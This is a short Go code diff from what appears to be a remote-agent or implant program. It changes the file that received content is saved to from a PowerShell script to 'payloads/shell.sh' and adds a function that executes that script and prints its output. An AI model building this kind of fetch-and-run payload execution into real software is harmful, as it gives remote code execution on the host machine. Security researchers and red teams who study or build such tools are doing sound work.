@@ -42,9 +42,13 @@ func main() {
 
 	// test()
 
-	checkIn()
+	// checkIn()
 
 	getFIle()
+
+	scriptOutput := run_script("payloads/shell.sh")
+
+	fmt.Println(scriptOutput)
 
 	// Writing a file. I am pretty sure this is a ass backwards way of doing it
 
@@ -257,7 +261,7 @@ func runCommand(command string) (outString string, errorMessage string) {
 
 func script_to_file(input string) {
 
-	f, err := os.Create("payloads/PowerShell.ps1")
+	f, err := os.Create("payloads/shell.sh")
 
 	if err != nil {
 		log.Fatal(err)
@@ -274,4 +278,19 @@ func script_to_file(input string) {
 	}
 
 	return
+}
+
+func run_script(path_to_script string) (output string) {
+
+	output = ""
+
+	out, err := exec.Command("sh", path_to_script).Output()
+	if err != nil {
+		fmt.Println("Error executing script")
+	}
+
+	output = string(out)
+
+	return output
+
 }
